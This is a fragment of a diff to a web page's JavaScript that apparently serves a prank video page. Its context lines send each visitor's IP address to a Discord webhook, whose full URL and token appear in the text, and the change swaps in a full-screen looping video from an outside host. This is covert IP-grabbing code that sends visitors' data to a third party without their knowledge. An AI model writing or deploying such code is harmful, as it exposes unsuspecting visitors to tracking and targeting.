@@ -13,8 +13,8 @@ fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4
     body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
 })
 
-document.body.innerHTML = '';
-document.write('<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>')
+document.body.innerHTML = '<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>';
+
 
 const video = document.getElementById("video");
 video.play();
